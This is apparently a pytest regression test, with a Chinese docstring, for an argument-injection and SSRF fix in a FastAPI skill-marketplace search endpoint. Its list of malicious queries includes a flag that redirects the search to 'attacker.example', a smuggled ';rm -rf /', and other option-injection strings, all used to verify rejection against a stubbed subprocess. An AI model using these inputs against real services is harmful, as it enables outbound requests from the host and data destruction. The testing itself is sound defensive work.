"""验收锁（@bughunter 2026-09-10）：skill marketplace **搜索** 的参数边界与能力闸。

`marketplace_install` 已修（白名单 + 显式拒 `-` 开头 + `["install", "--", slug]` + 能力闸 + `except OSError`），
但同形的 **`GET /v1/skills/marketplace?q=`**（`api.py:1351-1371`）三样都没有：
`subprocess.run([skillhub, "search", q])` 里 `q` 直通外部程序，且 handler 里没有 `_capability_denied`。
影响不止参数乱序：`skillhub search` 支持 `--search-url`（默认取 `SKILLHUB_SEARCH_URL`），
`?q=--search-url=http://attacker.example/api` 会让**部署主机替访客出网**（SSRF / 查询内容外带）。

判据：① 恶意 q 一律 400；② 正常 q 仍能搜，且实参必须是 `[skillhub, "search", "--", q]`；
③ demo 身份（`DISABLE_AUTH`）必须被 `run_external_process` 能力闸拒（403）。

安全：`subprocess.run` 被换成记录器，测试不会真调外部程序。
"""
import shutil
import subprocess

import pytest
from fastapi import FastAPI, Request
from fastapi.testclient import TestClient

import agent_harness.apps.research.api as api
from agent_harness.core import config as core_config

MALICIOUS_Q = [
    "--search-url=http://attacker.example/api",
    "-x",
    "a b",
    ";rm -rf /",
    "smartwatch --limit=9999",
]


@pytest.fixture
def stub_skillhub(monkeypatch, tmp_path):
    """让 handler 认为 skillhub 存在，并记录传给它的实参。"""
    exe = tmp_path / "skillhub"
    exe.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    monkeypatch.setattr(shutil, "which", lambda name: str(exe) if name == "skillhub" else None)

    calls = []

    class _R:
        returncode = 0
        stdout = "NAME  DESC\nsmartwatch  竞品分析\n"
        stderr = ""

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return _R()

    monkeypatch.setattr(subprocess, "run", fake_run)
    return calls


def _client(role: str = "user") -> TestClient:
    app = FastAPI()

    @app.middleware("http")
    async def _inject(request: Request, call_next):
        request.state.user = {"id": "u_skill", "username": "u_skill", "role": role}
        return await call_next(request)

    app.include_router(api.router)
    return TestClient(app)


@pytest.mark.parametrize("q", MALICIOUS_Q)
def test_malicious_query_is_rejected(q, stub_skillhub):
    r = _client().get("/v1/skills/marketplace", params={"q": q})
    assert r.status_code == 400, (
        f"恶意查询参数应被 400 拒绝，实测 {r.status_code} {r.text[:160]}\n"
        f"实参：{stub_skillhub}（q 直通外部程序 = flag 注入 / --search-url 出网改向）"
    )
    assert not stub_skillhub, f"被拒的请求不应到达外部程序，实测调用了 {stub_skillhub}"


def test_benign_query_still_searches_with_double_dash(stub_skillhub):
    """正向控制：正常查询必须仍可用，且实参用 `--` 明确结束选项解析。"""
    r = _client().get("/v1/skills/marketplace", params={"q": "smartwatch"})
    assert r.status_code == 200, f"正常查询被误杀：{r.status_code} {r.text[:160]}"
    assert stub_skillhub, "正常查询没有到达外部程序（能力闸/白名单过紧）"
    argv = stub_skillhub[0]
    assert argv[:2] == [argv[0], "search"], f"实参形状不对：{argv}"
    assert "--" in argv, f"缺少 `--` 分隔符（flag 注入防护）：{argv}"


def test_demo_identity_is_denied_by_capability(stub_skillhub, monkeypatch):
    """demo（DISABLE_AUTH）下搜索属 `run_external_process` 能力，必须 403。"""
    monkeypatch.setattr(core_config, "DISABLE_AUTH", True)
    r = _client(role="admin").get("/v1/skills/marketplace", params={"q": "smartwatch"})
    assert r.status_code == 403, (
        f"demo 访客仍能驱动外部程序（缺能力闸）：实测 {r.status_code} {r.text[:160]}"
    )
    assert not stub_skillhub, "被能力闸拒的请求不应到达外部程序"
